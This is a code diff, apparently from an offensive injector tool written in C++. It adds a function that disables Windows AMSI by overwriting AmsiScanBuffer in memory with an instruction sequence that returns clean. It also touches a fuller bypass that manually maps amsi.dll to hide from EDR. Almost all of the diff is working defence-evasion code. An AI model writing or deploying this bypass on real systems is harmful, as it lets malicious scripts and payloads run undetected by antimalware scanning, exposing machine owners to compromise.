@@ -61,11 +61,35 @@ PVOID g_pLdrLoadDll = nullptr;
 
 
 
+void basicAmsiBypass() {
+    HMODULE amsi = LoadLibraryA("amsi.dll");
+    PVOID scanBuffer = GetProcAddress(amsi, "AmsiScanBuffer");
+    unsigned char patch[] = { 0x31, 0xC0, 0xC3 }; // xor eax, eax; ret
+    SIZE_T patchSize = sizeof(patch);
+
+    std::cout << "[!] Patching AMSI at: " << scanBuffer << std::endl;
+
+    // 2. Change protection to RW
+    mainInjector.protectMemFlag(HANDLE(-1), scanBuffer, PAGE_READWRITE, patchSize);
+
+    // 3. Write the patch
+    mainInjector.wrMem(HANDLE(-1), scanBuffer, (LPVOID)patch, patchSize);
+
+    // 4. Restore protection to RX
+    mainInjector.protectMemFlag(HANDLE(-1), scanBuffer, PAGE_EXECUTE_READ, patchSize);
+}
 
 
 
-
-bool FullAmsiBypass() {
+bool FullAmsiBypass(bool powershell) {
+    /*
+    * 
+    * if (powershell) {
+        basicAmsiBypass();
+        return true;
+    }
+    
+    */
     // 1. Manually map amsi.dll into our process
     // This copy is invisible to the OS/EDR because it's not in the PEB
     std::vector<unsigned char> buff = ReadFileToBuffer("C:\\Windows\\System32\\amsi.dll");
